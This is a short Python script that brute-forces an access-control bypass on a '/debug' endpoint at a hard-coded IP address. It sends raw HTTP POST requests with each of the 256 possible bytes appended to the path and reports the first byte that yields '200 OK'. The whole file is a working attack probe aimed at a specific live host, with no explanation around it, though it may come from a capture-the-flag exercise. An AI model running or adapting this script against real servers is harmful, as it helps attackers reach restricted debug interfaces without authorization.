import socket
import json

host = "161.97.155.116"
port = 80
data = {"name": "manini"}
body = json.dumps(data)

for byte in range(256):
    request = (
        b"POST /debug" + bytes([byte]) + b" HTTP/1.1\r\n"
        b"Host: " + host.encode() + b"\r\n"
        b"Content-Type: application/json\r\n"
        b"Content-Length: " + str(len(body)).encode() + b"\r\n"
        b"Connection: close\r\n"
        b"\r\n" + body.encode()
    )
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        s.sendall(request)
        response = s.recv(4096).decode()
        if "200 OK" in response:
            print(f"Bypass found with byte \\x{byte:02x}")
            break
